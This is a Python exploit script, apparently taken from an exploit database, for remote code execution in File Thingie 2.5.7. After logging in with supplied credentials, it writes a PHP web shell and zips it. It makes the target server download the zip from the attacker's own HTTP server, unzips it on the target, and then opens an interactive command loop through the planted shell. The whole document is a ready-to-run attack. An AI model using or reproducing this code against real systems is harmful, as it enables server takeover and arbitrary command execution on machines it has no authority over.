#!/usr/bin/python3
# Exploit Title: File Thingie v2.5.7 - Remote Code Execution
# Exploit Author: H4rk3nz0
# Original POC: https://www.exploit-db.com/exploits/47349
# Software Download: https://github.com/leefish/filethingie
# Script will ZIP, Upload and Unzip File then create looped shell to perform command execution

import requests
import random
import string
import sys
import os
import urllib3
from time import sleep

urllib3.disable_warnings()

try:
	rhost = str(sys.argv[1])
	uri = str(sys.argv[2])
	login_file = str(sys.argv[3])
	username = sys.argv[4]
	password = sys.argv[5]
	lhost = sys.argv[6]
except:
	print("\n[!] USAGE: python3 " + sys.argv[0] + " <target-ip:port> <target-uri> <main-php-page> <username> <password> <local-ip>\n")
	print("[=>] EXAMPLE ONE: python3 " + sys.argv[0] + " 192.168.24.15:80 /filethingie/ ft2.php admin admin 192.168.19.24")
	print("[=>] EXAMPLE TWO: python3 " + sys.argv[0] + " 192.168.24.15:8080 / index.php admin admin 192.168.19.24")


def login(url):
	header_values = {"Referer": "http://" + rhost + uri, "User-Agent": "H4rk3nz0s Dank Browser/4.20 (X69; Linux x86_64)",
	 "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + rhost}
	session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=35))
	cookie_values = {"PHPSESSID":session_id}
	login_values = {"ft_user": username, "ft_pass": password, "act": "dologin"}
	response = requests.post(url, headers=header_values, cookies=cookie_values, data=login_values, verify=False)
	if "File Thingie Login" not in str(response.content):
		print("[+] LOGIN SUCCESS")
		return True, session_id
	else:
		return False, session_id


def zipUpload(session_id, url):
	header_values = {"Referer": "http://" + rhost + uri + login_file, "User-Agent": "H4rk3nz0s Dank Browser/4.20 (X69; Linux x86_64)",
	"Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + rhost}
	cookie_values = {"PHPSESSID":session_id}
	upload_values = {"type":"url", "newdir":"http://" + lhost + ":9696/" + "h4rk.zip", "act":"createdir","dir":"","submit":"Ok"}
	start_http = input("[!] START HTTP SERVER WITH THIS COMMAND IN ANOTHER WINDOW THEN PRESS ENTER TO CONTINUE: python -m SimpleHTTPServer 9696")
	requests.post(url, headers=header_values, cookies=cookie_values, data=upload_values, verify=False)
	os.system("rm h4rk.zip && rm h4rk.php")
	check = requests.get("http://" + rhost + uri + "h4rk.zip", headers=header_values, cookies=cookie_values, verify=False)
	if check.status_code == 200:
		print("[+] ZIP UPLOADED SUCCESSFULY")
		return True
	else:
		return False

def zipUnzip(session_id, url):
	header_values = {"Referer": "http://" + rhost + uri + login_file + "?dir=", "User-Agent": "H4rk3nz0s Dank Browser/4.20 (X69; Linux x86_64)",
	"Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + rhost}
	unzip_values = {"newvalue":"h4rk.zip", "file":"h4rk.zip","dir":"","act":"unzip"}
	cookie_values = {"PHPSESSID":session_id}
	requests.post(url, headers=header_values, cookies=cookie_values, data=unzip_values, verify=False)
	check = requests.get("http://" + rhost + uri + "h4rk.php", headers=header_values, cookies=cookie_values, verify=False)
	if check.status_code == 200:
		print("[+] UNZIP SUCCESSFUL")
		return True
	else:
		return False

if __name__ =="__main__":
	url = "http://" + rhost + uri + login_file
	print("[!] SPECIFIED TARGET URL: " + url)
	authenticated, session_id = login(url)
	if authenticated == True:
		print("[+] SESSION ID: " + session_id)
		print("[+] MAKING A THINGIE FOR THINGIE")
		os.system("echo \'<?php system($_GET[\"cmd\"]); ?>\' > h4rk.php &")
		print("[+] CREATING ZIP")
		os.system("zip h4rk.zip h4rk.php")
		print("[+] UPLOADING ZIP FILE")
		upload = zipUpload(session_id, url)
		if upload == True:
			unzip = zipUnzip(session_id, url)
			if unzip == True:
				user_query = requests.get("http://" + rhost + uri + "h4rk.php?cmd=whoami")
				user = (user_query.text).replace("\n", "")
				while True:
					command = input(user + "$ ")
					if command == 'exit':
						break
						exit()
					else:
						execute = requests.get("http://" + rhost + uri + "h4rk.php?cmd=" + str(command))
						response = execute.text
						print('\n' + response)
						continue
			else:
				print("[-] UNZIP FAILED, ATTEMPT MANUALLY?")
				exit()
		else:
			print("[-] ZIP UPLOAD FAILED")
			exit()
	else:
		print("[-] LOGIN FAILED")
		exit()
